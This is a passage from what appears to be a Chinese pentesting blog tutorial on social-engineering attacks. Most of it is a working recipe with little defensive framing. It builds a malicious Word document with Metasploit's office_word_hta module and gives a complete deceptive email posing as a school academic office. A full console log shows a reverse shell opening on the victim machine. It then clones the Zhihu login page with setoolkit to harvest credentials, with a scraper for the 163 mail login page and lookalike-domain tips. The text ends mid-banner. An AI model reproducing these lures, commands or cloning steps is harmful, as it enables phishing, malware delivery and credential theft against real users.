src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/10.PNG" ,="" width="600"></p><p>通过上图，我们主要分析如下信息：</p><ol><li>所开启的端口：4444、8080</li><li>链接地址：<a href="http://192.168.31.103:8080/default.hta" target="_blank" rel="noopener">http://192.168.31.103:8080/default.hta</a></li><li>木马文件路径：/root/.msf4/local/教务处通知务必查收.doc</li></ol><p>至此，我们的木马文件就已经生成了，我们需要进一步的加以利用。<br><img src="https://ws2.sinaimg.cn/bmiddle/6af89bc8gw1f8r1dlii2aj203s04mt8i.jpg"></p><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>OK，现在我们需要通过邮件来将该文件发送给攻击目标了，在对方下载并打开的一瞬间也就是他落入陷阱的时候，在这里我们使用的是QQ邮件，然后博主还不想坐牢，所以就拿自己的账号来演示了，<code>攻击账号：510087153@qq.com，目标账号：26647879@qq.com</code>。好的，下面我们来模拟一下邮件的发送过程，邮件的主题及内容就要考验我们的欺骗等级了。为了提高对方掉入陷阱的概率，我们通过<code>510087153@qq.com</code>账号编辑邮件的主题及正文内容编写如下（这个不是很会写，就随便写写吧，其实在实际攻击的过程中是需要收集目标大量数据的）：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主题：教务处通知，务必查看</span><br><span class="line">正文：</span><br><span class="line">Zero同学：</span><br><span class="line">    你好，我是教务处的王老师，主要负责通知有无法正常毕业可能的学生。</span><br><span class="line">    从最近几学期你的在校表现来看，你有长期旷课、打架斗殴、成帮结派的行为，对此给学校带来许多负面影响。为此教务处将对你下达黄牌警告，为了</span><br><span class="line">保证你的正常毕业，还请仔细阅读附件内容。如若不然，则将会采取进一步的措施：向家长通报、升旗仪式上通报、公告栏通报。仔细阅读附件后，务必在</span><br><span class="line"><span class="number">1</span>小时内给予回复，否则后果自负。</span><br><span class="line">    </span><br><span class="line">教务处，王老师</span><br></pre></td></tr></table></figure></p><p>编辑好后，如下所示。<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/6.png" width="600"></p><p>OK，供给端的操作至此就已经完成了，确认无误并没有明显造假痕迹之后，我们发送邮件然后等待对方“咬钩”即可。</p><p>之后，我们回到目标机windows，发现目标账号此时已经收到了一封来自教务处的邮件，我们打开邮件既能见到如上邮件内容（此刻目标的心理活动请读者自行脑补，这里就不再描述了）。待目标阅读完成之后并将附件<code>教务处通知务必.doc</code>下载到本地，若目标打开文件之后则已经“咬钩”了。</p><p>OK，不管目标打开的文件是空也好，乱码也罢，只要他鼠标左键双击的一瞬间则已经达到了攻击者的目的了。这是，我们再次回到Kali Linux的终端，显示内容如下所示：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/11.PNG" width="600"></p><p>通过上图，我们发现已经获得了目标的session会话，并显示了目标的ip，此时我们就能拿对方的服务器“为所欲为”了，比如摄像头监控、映射文件、桌面捕捉等等坐牢性操作。我们可通过如下命令获取对方的终端权限：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions -l </span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line">shell</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure></p><blockquote><p>补充：获取到目标终端之后也许会乱码，我们执行chcp 65001即可解决</p></blockquote><p>之后的Dos命令操作这里就不再细说了，有兴趣的朋友可以跳转之前写的一篇文章：<img></p><h3 id="完整命令"><a href="#完整命令" class="headerlink" title="完整命令"></a>完整命令</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@kali:</span>~# msfconsole </span><br><span class="line">[-] Failed to connect to the database: could <span class="keyword">not</span> connect to server: Connection refused</span><br><span class="line">Is the server running on host <span class="string">"localhost"</span> (::<span class="number">1</span>) <span class="keyword">and</span> accepting</span><br><span class="line">TCP/<span class="built_in">IP</span> connections on port <span class="number">5432</span>?</span><br><span class="line">could <span class="keyword">not</span> connect to server: Connection refused</span><br><span class="line">Is the server running on host <span class="string">"localhost"</span> (<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>) <span class="keyword">and</span> accepting</span><br><span class="line">TCP/<span class="built_in">IP</span> connections on port <span class="number">5432</span>?</span><br><span class="line"></span><br><span class="line">                                                  </span><br><span class="line"><span class="keyword">Call</span> trans opt: received. <span class="number">2</span>-<span class="number">19</span>-<span class="number">98</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">18</span> REC:Loc</span><br><span class="line"></span><br><span class="line">     Trace program: running</span><br><span class="line"></span><br><span class="line">           wake <span class="meta">up</span>, Neo...</span><br><span class="line">        the matrix has you</span><br><span class="line">      follow the white rabbit.</span><br><span class="line"></span><br><span class="line">          knock, knock, Neo.</span><br><span class="line"></span><br><span class="line">                        (<span class="string">`.         ,-,</span></span><br><span class="line"><span class="string">                        `</span> <span class="string">`.    ,;' /</span></span><br><span class="line"><span class="string">                         `</span>.  ,<span class="string">'/ .'</span></span><br><span class="line">                          <span class="string">`. X /.'</span></span><br><span class="line"><span class="string">                .-;--''--.._`</span> <span class="string">` (</span></span><br><span class="line"><span class="string">              .'            /   `</span></span><br><span class="line">             ,           <span class="string">` '   Q '</span></span><br><span class="line"><span class="string">             ,         ,   `</span>._    \</span><br><span class="line">          ,.|         <span class="string">'     `-.;_'</span></span><br><span class="line">          :  . <span class="string">`  ;    `</span>  <span class="string">` --,.._;</span></span><br><span class="line"><span class="string">           ' `</span>    ,   )   .<span class="string">'</span></span><br><span class="line"><span class="string">              `._ ,  '</span>   /_</span><br><span class="line">                 <span class="comment">; ,''-,;' ``-</span></span><br><span class="line">                  <span class="string">``-..__`</span><span class="string">`--`</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">                             https:</span>//metasploit.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4<span class="meta">.17</span><span class="meta">.25</span>-dev                         ]</span><br><span class="line">+ -- --=[ <span class="number">1828</span> exploits - <span class="number">1033</span> auxiliary - <span class="number">318</span> post       ]</span><br><span class="line">+ -- --=[ <span class="number">541</span> payloads - <span class="number">44</span> encoders - <span class="number">10</span> nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-<span class="number">7.</span>co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/fileformat/office_word_hta </span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/fileformat/office_word_hta):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.doc          yes       The file name.</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">   SRVPORT   <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL       false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                    no        Path to a custom SSL certificate (<span class="meta">default</span> is randomly generated)</span><br><span class="line">   URIPATH   <span class="meta">default</span>.hta      yes       The URI to use for the HTA file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Microsoft Office <span class="built_in">Word</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; set SRVHOST <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span></span><br><span class="line">SRVHOST =&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; set FIlENAME 教务处通知务必查收.doc</span><br><span class="line">FIlENAME =&gt; 教务处通知务必查收.doc</span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; exploit</span><br><span class="line">[*] Exploit running as background job <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> </span><br><span class="line">[+] 教务处通知务必查收.doc stored <span class="meta">at</span> /root/.msf4/local/.doc</span><br><span class="line">[*] Using URL: http://<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">8080</span>/<span class="meta">default</span>.hta</span><br><span class="line">[*] Server started.</span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; [*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52520</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">45</span> +<span class="number">0800</span></span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">2</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52519</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">48</span> +<span class="number">0800</span></span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52521</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">48</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information          Connection</span><br><span class="line">  --  ----  ----                     -----------          ----------</span><br><span class="line">  <span class="number">1</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52520</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line">  <span class="number">2</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52519</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52521</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction with <span class="number">1</span>...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">3980</span> created.</span><br><span class="line">Channel <span class="number">3</span> created.</span><br><span class="line">Microsoft Windows [?汾 <span class="number">6.1</span><span class="meta">.7601</span>]</span><br><span class="line">??????? (c) <span class="number">2009</span> Microsoft Corporation???????????????</span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;chcp <span class="number">65001</span></span><br><span class="line">chcp <span class="number">65001</span></span><br><span class="line">Active code page: <span class="number">65001</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C is Windows</span><br><span class="line"> Volume Serial Number is 12B9-032A</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\TXJ\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">32</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">32</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">36</span>             <span class="number">2</span>,<span class="number">461</span> Google Chrome.lnk</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">42</span>    &lt;DIR&gt;          images</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">08</span>  <span class="number">04</span>:<span class="number">27</span>                <span class="number">95</span> 新建文本文档.txt</span><br><span class="line">               <span class="number">2</span> File(s)          <span class="number">2</span>,<span class="number">556</span> bytes</span><br><span class="line">               <span class="number">3</span> Dir(s)  <span class="number">30</span>,<span class="number">969</span>,<span class="number">548</span>,<span class="number">800</span> bytes free</span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;</span><br></pre></td></tr></table></figure><h2 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h2><p>除了上述社工邮件之外，在实际过程中钓鱼网站也是比较常见的。钓鱼网站主要是先通过爬虫手段先爬取常见的登录页面，比如像163邮箱之类的常见应用。下面附一个Python的小爬虫Demo来爬取163登录页并保存：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">import requests</span><br><span class="line">except:</span><br><span class="line">import os</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"The package is downloading......"</span>)</span><br><span class="line">os.system(<span class="string">"python -m pip install --upgrade pip &amp;&amp; pip install requests"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"The requirement already satisfied"</span>)</span><br><span class="line"></span><br><span class="line">def get_page(url, headers):</span><br><span class="line">try:</span><br><span class="line"><span class="keyword">if</span> requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).status_code == 200:</span><br><span class="line">request = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers)</span><br><span class="line">request.encoding = <span class="string">"utf-8"</span></span><br><span class="line">return request.text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"Error! Please resend the request"</span>)</span><br><span class="line">return get_page(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).text</span><br><span class="line">except RequestException as e:</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"&#123;&#125;&#123;&#125;Error! Please resend the request"</span>.format(e, <span class="string">"\n"</span>))</span><br><span class="line">return get_page(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span></span><br><span class="line">&#125;</span><br><span class="line">html = get_page(url = <span class="string">"https://mail.163.com/"</span>, <span class="attribute">headers</span>=headers)</span><br><span class="line">with open(<span class="string">"163maillogin.html"</span>, <span class="string">"w"</span>, <span class="attribute">encoding</span>=<span class="string">"utf-8"</span>) as f:</span><br><span class="line">f.write(html)</span><br></pre></td></tr></table></figure></p><p><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/4.png" width="600"></p><p>爬取好后，我们就能将该页面发布到自己的服务器中然后等待受害者的登录，待其输入账号密码之后就会在我们的Kali Linux终端截取到账号及密码了，下面我们通过<code>setoolkit</code>工具来模拟实现该钓鱼网站的过程。</p><h3 id="setoolkit攻击"><a href="#setoolkit攻击" class="headerlink" title="setoolkit攻击"></a>setoolkit攻击</h3><p>在Kali终端执行<code>setoolkit</code>，执行之后我们会见到如下内容：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/12.PNG" width="600"></p><p>之后，我们选择第一个选项<code>Social-Engineering Attacks</code>社会工程学，选择并回车之后，我们可见如下内容：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Select <span class="keyword">from</span> the menu:</span><br><span class="line"></span><br><span class="line"> 1) Spear-Phishing Attack Vectors　　　　　　＃ 鱼叉式钓鱼攻击向量</span><br><span class="line"> 2) Website Attack Vectors　　　　　　       ＃ 网页攻击向量</span><br><span class="line"> 3) Infectious Media Generator　　　　       ＃ 媒介感染生成器</span><br><span class="line"> 4) Create a Payload <span class="keyword">and</span> Listener　　       ＃ 生成一个payload并监听</span><br><span class="line"> 5) Mass Mailer Attack　　　　　　　　　     ＃ 大规模邮件钓鱼</span><br><span class="line"> 6) Arduino-Based Attack Vector　　　　     ＃ Arduino的攻击</span><br><span class="line"> 7)<span class="built_in"> Wireless </span>Access Point Attack Vector　　 ＃ 无线接入点攻击</span><br><span class="line"> 8) QRCode Generator Attack Vector　　　　　＃ 二维码攻击</span><br><span class="line"> 9) Powershell Attack Vectors　　　　　　    ＃ powershell攻击</span><br><span class="line">10) Third Party Modules　　　　　　　　　　  ＃ 第三方模块</span><br><span class="line">　　</span><br><span class="line">99) Return back <span class="keyword">to</span> the main menu.</span><br></pre></td></tr></table></figure></p><p>通过上述11个选项的解释，我们已经认识到了该社会工程学的强大了并对社会工程学<code>setoolkit</code>工具有了一个大概的了解了，此次我们用到的是第二个模块<code>Website Attack Vectors</code>，之后进一步进行第三个选项<code>Credential Harvester Attack Method</code>，随后选择第二个<code>Site Cloner</code>。执行之后，我们可见如下内容：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/15.PNG" width="600"></p><p>之后我们输入目标网页从而将爬取网页的源代码并创建一个80端口的服务，比如此次我们拿知乎的登录首页来进行演示，为此我们输入<code>https://www.zhihu.com/signup?next=%2F</code>，如上述所编代码一样，该命令会将知乎的登录页面爬取下来然后将该页面发布到本机的80端口服务中，我们来访问该页面看看：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/14.PNG" width="600"></p><p>OK，如你所见，此时的页面除了域名不一样之外，其他的内容完全是一模一样的，在实际“钓鱼”的过程中，攻击者往往会将域名尽量的相似化，比如<code>pq.com、pp.com、zhlhu.com、zhini.com</code>。这就好比考试，命题人总会出一些及其容易错的题目，也许你一个不小心就会失算从而正中命题者的陷阱，比如Zero前几天遇到的几道题：<br><img src="https://tuili.muzimz.cn/Tuili/uploads/images/blog_images/shentougongji/5.png" width="600"></p><p>命题人往往会根据自己的自身经验尝试着去抓住大部分考生的弱点，从而得到一个选拔的效果，待你发现自身的错误之后恐怕为时已晚，分已经丢了，我们此刻能做的也只有扇扇自己几个耳光来小惩罚以下自己。</p><p>跑题了，回来吧。</p><p>社会工程学也是一样的，目标一不留神就会“咬钩”。如上所述，我们访问之后会发现一模一样的页面，此时我们尝试着输入账号密码试试，会发现用户端并没有什么明显的反应，我们再来回到Kali Linux看看，果然，你的账号、密码已经成功被截取到了。账号、密码被攻击者拿到之后，后面所发生的事我想不必介绍大家也都了解了。</p><h3 id="完整命令-1"><a href="#完整命令-1" class="headerlink" title="完整命令"></a>完整命令</h3><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XX                                                                          XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMMMMMss<span class="string">''</span><span class="string">'                          '</span><span class="string">''</span>ssMMMMMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMMMMMyy<span class="string">''</span>                                    <span class="string">''</span>yyMMMMMMMMMMMM   XX</span><br><span class="line">XX   MMMMMMMMyy<span class="string">''</span>                                            <span class="string">''</span>yyMMMMMMMM   XX</span><br><span class="line">XX   MMMMMy<span class="string">''</span>                                                    <span class="string">''</span>yMMMMM   